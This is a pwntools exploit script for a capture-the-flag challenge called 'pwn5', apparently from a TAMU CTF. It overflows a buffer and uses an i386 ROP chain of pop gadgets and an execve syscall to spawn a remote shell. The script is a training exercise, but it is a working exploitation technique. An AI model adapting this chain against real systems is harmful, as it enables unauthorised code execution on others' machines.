from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = '/bin/sh\x00\n'
    buf += 'hihi\n'
    buf += 'major\n'
    proc.send(buf)
    sleep(0.1)
    proc.send('y\n')
    sleep(0.1)
    proc.send('2\n')

    pop_eax = 0x080bc396
    pop_ebx = 0x080481d1
    pop_ecx = 0x080e4325
    pop_edx = 0x0807338a
    syscall = 0x08071005
    bin_sh = 0x080F1A20
    buf = 'A' * (0x1c + 4)
    buf += flat([pop_eax, 0xb, pop_ebx, bin_sh, pop_ecx, 0, pop_edx, 0, syscall])
    sleep(0.1)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc pwn.ctf.tamu.edu 4325'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./pwn5'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
